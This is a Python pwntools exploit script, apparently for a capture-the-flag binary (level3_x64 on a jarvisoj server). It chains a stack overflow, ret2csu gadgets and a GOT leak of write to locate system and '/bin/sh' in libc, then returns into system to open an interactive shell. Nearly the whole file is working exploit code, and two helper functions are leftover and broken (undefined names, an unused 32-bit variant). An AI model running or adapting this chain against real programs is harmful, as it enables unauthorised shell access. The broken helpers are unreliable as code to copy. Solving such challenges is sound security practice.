#!/usr/bin/python

from pwn import *


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


def leak_addr():
    '''
    leak system addr and binsh addr
    '''
    global io
    global elf
    global libc

    payload  = 'A' * (0x88+0x4) 
    payload += p32(elf.plt['write']) # plt of write
    payload += p32(0x08048484)       # main function -> the ret addr of write
    payload += p32(1)                # fd
    payload += p32(elf.got['write']) # 
    payload += p32(4)                # len
    
    io.recvuntil('Input:\n')
    io.sendline(payload)
    write_addr = u32(io.recv(4))
    
    libc_offset  = write_addr  - libc.symbols['write']
    system_addr  = libc_offset + libc.symbols['system'] 
    binsh_addr   = libc_offset + libc.search('/bin/sh').next()
    
    return (system_addr, binsh_addr)
    

def exploit():
    global io
    global elf
    global libc 

    csu_gadget_addr_1 = 0x00000000004006AA
    csu_gadget_addr_2 = 0x0000000000400690
    vul_function_addr = 0x00000000004005E6
    one_gadget_addr   = 0x00000000004006b3 # pop rdi; ret

    payload  = 'A' * (0x80 + 0x8)     # padding
    payload += p64(csu_gadget_addr_1) # ret to gadget1
    payload += p64(0)                 # pop rbx
    payload += p64(1)                 # pop rbp
    payload += p64(elf.got['write'])  # pop r12 -> the function to call
    payload += p64(8)                 # pop r13 -> the function argv3
    payload += p64(elf.got['write'])  # pop r14 -> the function argv2
    payload += p64(1)                 # pop r15 -> the function argv1
    payload += p64(csu_gadget_addr_2) # ret to gadget2
    payload += 'A' * 0x38             # padding 8 x 7 
    payload += p64(vul_function_addr) # return to vul func
    
    io.recvuntil('Input:\n')
    io.sendline(payload)
    sleep(0.5)
    write_addr = u64(io.recv(8))

    libc_base   = write_addr - libc.symbols['write']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr  = libc_base + libc.search('/bin/sh').next()

    print(hex(system_addr))
    print(hex(binsh_addr))

    payload  = 'A' * (0x80 + 0x8)
    payload += p64(one_gadget_addr) # ret addr
    payload += p64(binsh_addr)      # binsh
    payload += p64(system_addr)     # system 

    io.recvuntil('Input:\n')
    io.sendline(payload)
    
    # get shell
    io.interactive()


if __name__ == '__main__':
    target_elf  = './level3_x64'
    target_libc = './libc-2.19.so'
    local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
    target_host = 'pwn2.jarvisoj.com'
    target_port = '9883'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    LOCAL = True
    LOCAL = False

    elf = ELF(target_elf)

    if LOCAL:
        libc = ELF(local_libc)
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, 
        '''b *0x0000000000400613
        #b *0x0000000000400DC8''')
    else:
        libc = ELF(target_libc)
        io = remote(target_host, target_port)
    
    exploit()


